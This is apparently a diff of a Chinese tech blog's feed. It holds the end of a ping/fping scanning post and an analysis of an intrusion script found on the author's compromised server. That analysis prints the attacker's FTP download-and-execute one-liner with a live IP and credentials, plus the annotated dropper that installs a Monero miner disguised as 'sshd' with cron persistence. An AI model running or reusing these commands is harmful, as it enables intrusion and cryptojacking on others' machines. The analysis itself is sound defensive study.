+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  ping -W &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; -c &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; $ip &amp;amp;&amp;gt; /dev/null
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; $? -eq &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    echo $ip is alive
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    echo $ip is dead
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;fi&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;done&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;使用-fping&#34;&gt;使用 fping&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;优点
+&lt;ul&gt;
+&lt;li&gt;速度快&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;缺点
+&lt;ul&gt;
+&lt;li&gt;需要安装 fping&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 安装fping&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;brew install fping &lt;span style=&#34;color:#75715e&#34;&gt;# mac&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;yum install fping &lt;span style=&#34;color:#75715e&#34;&gt;# centos&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;apt install fping &lt;span style=&#34;color:#75715e&#34;&gt;# debian&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;我用的 fping 是 MacOS X， fping 的版本是 4.2&lt;/p&gt;</description>
     </item>
-    
     <item>
       <title>入侵脚本分析 - 瞒天过海</title>
       <link>https://wdd.js.org/shell/evil-script/</link>
       <pubDate>Mon, 23 Dec 2019 18:54:01 +0800</pubDate>
-      
       <guid>https://wdd.js.org/shell/evil-script/</guid>
-      <description>机器被入侵了，写点东西，分析一下入侵脚本，顺便也学习一下。
-bash -c curl -O ftp://noji:noji2012@153.122.137.67/.kde/sshd.tgz;tar xvf sshd.tgz;rm -rf sshd.tgz;cd .ssd;chmod +x *;./go -r 下载恶意软件 恶意软件的是使用 ftp 下载的， 地址是：ftp://noji:noji2012@153.122.137.67/.kde/sshd.tgz，这个 153.122.137.67 IP 是位于日本东京，ssd.taz 是一个 tar 包，用 tar 解压之后，出现一个 sh 文件，两个可执行文件。
--rwxr-xr-x 1 1001 1001 907 Nov 20 20:58 go # shell -rwxrwxr-x 1 1001 1001 1.3M Nov 20 21:06 i686 # 可执行 -rwxrwxr-x 1 1001 1001 1.1M Nov 20 21:06 x86_64 # 可执行 分析可执行文件 go go 是一个 shell 程序，下文是分析
-#!/bin/bash # pool.</description>
+      <description>&lt;p&gt;机器被入侵了，写点东西，分析一下入侵脚本，顺便也学习一下。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;bash -c curl -O ftp://noji:noji2012@153.122.137.67/.kde/sshd.tgz;tar xvf sshd.tgz;rm -rf sshd.tgz;cd .ssd;chmod +x *;./go -r
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;下载恶意软件&#34;&gt;下载恶意软件&lt;/h1&gt;
+&lt;p&gt;恶意软件的是使用 ftp 下载的， 地址是：ftp://noji:noji2012@153.122.137.67/.kde/sshd.tgz，这个 153.122.137.67 IP 是位于日本东京，ssd.taz 是一个 tar 包，用 tar 解压之后，出现一个 sh 文件，两个可执行文件。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rwxr-xr-x &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1001&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1001&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;907&lt;/span&gt; Nov &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt; 20:58 go &lt;span style=&#34;color:#75715e&#34;&gt;# shell&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rwxrwxr-x &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1001&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1001&lt;/span&gt; 1.3M Nov &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt; 21:06 i686 &lt;span style=&#34;color:#75715e&#34;&gt;# 可执行&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rwxrwxr-x &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1001&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1001&lt;/span&gt; 1.1M Nov &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt; 21:06 x86_64 &lt;span style=&#34;color:#75715e&#34;&gt;# 可执行&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;分析可执行文件-go&#34;&gt;分析可执行文件 go&lt;/h1&gt;
+&lt;p&gt;go 是一个 shell 程序，下文是分析&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/bin/bash
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# pool.supportxmr.com门罗币的矿池&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 所以大家应该清楚了，入侵的机器应该用来挖矿的&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 这一步是测试本机与矿池dns是否通&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;ping -c &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; pool.supportxmr.com 2&amp;gt;/dev/null|grep &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;bytes of data&amp;#34;&lt;/span&gt; | wc -l &lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt; -gt &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;0&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;;   &lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        dns&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# dns通&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        dns&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;-d&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# dns不通&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;fi&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 删除用户计划任务，并将报错信息清除&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;crontab -r 2&amp;gt;/dev/null
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 这一步不太懂&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;rm -rf /tmp/.lock 2&amp;gt;/dev/null
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 设置当前进程的名字，为了掩人耳目，起个sshd, 鱼目混珠&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;EXEC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sshd&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 获取当前目录&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;DIR&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;pwd&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 获取参数个数&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 这个程序传了一个 -r 参数，所以$#的值是1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$#&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;0&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;;	&lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	ARGS&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# 遍历每一个参数&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; var in &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$@&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$var&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; !&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;-f&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;;	&lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			ARGS&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$ARGS&lt;span style=&#34;color:#e6db74&#34;&gt; &lt;/span&gt;$var&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# $var不是-f, 所以ARGS被这是为-r&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;fi&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; ! -z &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$FAKEPROC&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;;	&lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			FAKEPROC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;$((&lt;/span&gt;FAKEPROC+1&lt;span style=&#34;color:#66d9ef&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# 这里不会执行，因为$FAKEPROC是空字符串&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;fi&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$var&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;-h&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;;	&lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			FAKEPROC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# 这里也不会执行&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;fi&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[[&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$FAKEPROC&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;2&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;]]&lt;/span&gt;;	&lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			EXEC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$var&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# 这里也不会执行&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;fi&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; ! -z &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$dns&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;;	&lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			ARGS&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$ARGS&lt;span style=&#34;color:#e6db74&#34;&gt; &lt;/span&gt;$dns&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# 如果本机与矿池dns通，则这里不会执行&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;fi&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;done&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;fi&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 创建目录&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;mkdir -- &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;.&lt;/span&gt;$EXEC&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;#创建 .sshd目录&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cp -f -- &lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;uname -m&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;.&lt;/span&gt;$EXEC&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;/&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$EXEC&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# uname -m获取系统架构，然后判断要把i686还是x86_64拷贝到.sshd目录, 并重命名为sshd&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;./&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;.&lt;/span&gt;$EXEC&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;/&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$EXEC&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; $ARGS -f -c &lt;span style=&#34;color:#75715e&#34;&gt;# 执行改名后的文件&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;rm -rf &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;.&lt;/span&gt;$EXEC&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 生成后续执行的脚本&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;#!/bin/bash
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;cd -- &lt;/span&gt;$DIR&lt;span style=&#34;color:#e6db74&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;mkdir -- .&lt;/span&gt;$EXEC&lt;span style=&#34;color:#e6db74&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;cp -f -- `uname -m` .&lt;/span&gt;$EXEC&lt;span style=&#34;color:#e6db74&#34;&gt;/&lt;/span&gt;$EXEC&lt;span style=&#34;color:#e6db74&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;./.&lt;/span&gt;$EXEC&lt;span style=&#34;color:#e6db74&#34;&gt;/&lt;/span&gt;$EXEC&lt;span style=&#34;color:#e6db74&#34;&gt; &lt;/span&gt;$ARGS&lt;span style=&#34;color:#e6db74&#34;&gt; -c
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;rm -rf .&lt;/span&gt;$EXEC&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &amp;gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$EXEC&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;chmod +x -- &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$EXEC&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 执行脚本&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;./&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$EXEC&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 生成计划任务执行脚本&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;* * * * * `pwd`/&lt;/span&gt;$EXEC&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; | sort - | uniq - | crontab -
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
